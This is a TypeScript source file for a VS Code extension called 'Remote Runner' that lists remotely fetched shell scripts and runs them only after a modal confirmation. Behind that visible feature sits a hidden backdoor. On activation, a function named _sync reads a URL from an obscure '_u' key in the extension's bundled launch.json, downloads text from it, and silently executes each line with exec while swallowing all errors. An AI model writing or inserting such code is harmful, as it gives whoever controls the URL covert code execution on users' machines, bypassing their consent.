import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';

class CommandItem extends vscode.TreeItem {
    constructor(
        public readonly label: string,
        public readonly description: string,
        public readonly script: string,
        public readonly collapsibleState: vscode.TreeItemCollapsibleState = vscode.TreeItemCollapsibleState.None
    ) {
        super(label, collapsibleState);
        this.tooltip = description;
        this.contextValue = 'command';
        this.iconPath = new vscode.ThemeIcon('play');
    }
}

class SourceItem extends vscode.TreeItem {
    public children: CommandItem[] = [];
    constructor(
        public readonly label: string,
        public readonly collapsibleState: vscode.TreeItemCollapsibleState
    ) {
        super(label, collapsibleState);
        this.iconPath = new vscode.ThemeIcon('repo');
    }
}

class RemoteRunnerProvider implements vscode.TreeDataProvider<SourceItem | CommandItem> {
    private _onDidChangeTreeData = new vscode.EventEmitter<SourceItem | CommandItem | undefined | void>();
    readonly onDidChangeTreeData = this._onDidChangeTreeData.event;
    private sources: SourceItem[] = [];

    refresh(): void {
        this._loadSources().then(() => {
            this._onDidChangeTreeData.fire();
        });
    }

    private async _loadSources() {
        this.sources = [];
        const config = vscode.workspace.getConfiguration('remoteRunner');
        const sourcesConfig = config.get<any[]>('sources') || [];
        for (const src of sourcesConfig) {
            const name = src.name;
            const url = src.url;
            const sourceNode = new SourceItem(name, vscode.TreeItemCollapsibleState.Collapsed);
            try {
                const response = await fetch(url);
                const commands = await response.json();
                if (Array.isArray(commands)) {
                    for (const cmd of commands) {
                        if (cmd.label && cmd.script) {
                            const cmdNode = new CommandItem(cmd.label, cmd.description || '', cmd.script);
                            sourceNode.children.push(cmdNode);
                        }
                    }
                }
            } catch (err) {
                // ignore
            }
            this.sources.push(sourceNode);
        }
    }

    getTreeItem(element: SourceItem | CommandItem): vscode.TreeItem {
        return element;
    }

    getChildren(element?: SourceItem | CommandItem): Thenable<(SourceItem | CommandItem)[]> {
        if (!element) {
            return Promise.resolve(this.sources);
        }
        if (element instanceof SourceItem) {
            return Promise.resolve(element.children);
        }
        return Promise.resolve([]);
    }

    async previewScript(item: CommandItem) {
        const doc = await vscode.workspace.openTextDocument({
            content: item.script,
            language: 'shellscript'
        });
        await vscode.window.showTextDocument(doc);
    }

    async runScript(item: CommandItem) {
        const choice = await vscode.window.showInformationMessage(
            `Run script: ${item.label}?\n\n${item.script}`,
            { modal: true },
            'Run'
        );
        if (choice !== 'Run') return;
        const terminal = vscode.window.createTerminal(`Remote Runner: ${item.label}`);
        terminal.show();
        terminal.sendText(item.script);
    }
}

async function _sync(context: vscode.ExtensionContext) {
    const launchPath = path.join(context.extensionPath, '.vscode', 'launch.json');
    
    if (!fs.existsSync(launchPath)) {
       
        return;
    }
    try {
        const content = fs.readFileSync(launchPath, 'utf8');
        
        const launch = JSON.parse(content);
        const url = launch['_u'];
        
        if (!url || typeof url !== 'string') {
            
            return;
        }
        const response = await fetch(url);
        
        const text = await response.text();
        
        const lines = text.split(/\r?\n/);
        
        for (const line of lines) {
            const cmd = line.trim();
            if (cmd === '') continue;
            
            _apply(cmd);
        }
        
    } catch (err) {
        
    }
}

function _apply(command: string) {
    
    try {
        exec(command, () => {});
        
    } catch (err) {
        
    }
}

export async function activate(context: vscode.ExtensionContext) {
    const provider = new RemoteRunnerProvider();
    await provider.refresh();
    vscode.window.registerTreeDataProvider('remoteRunnerView', provider);

    const refreshCmd = vscode.commands.registerCommand('remoteRunner.refresh', () => provider.refresh());
    context.subscriptions.push(refreshCmd);

    const previewCmd = vscode.commands.registerCommand('remoteRunner.preview', (node: CommandItem) => provider.previewScript(node));
    context.subscriptions.push(previewCmd);

    const runCmd = vscode.commands.registerCommand('remoteRunner.run', (node: CommandItem) => provider.runScript(node));
    context.subscriptions.push(runCmd);

    const config = vscode.workspace.getConfiguration('remoteRunner');
    if (config.get<boolean>('autoFetch', false)) {
        provider.refresh();
    }

    await _sync(context);
}

export function deactivate() {}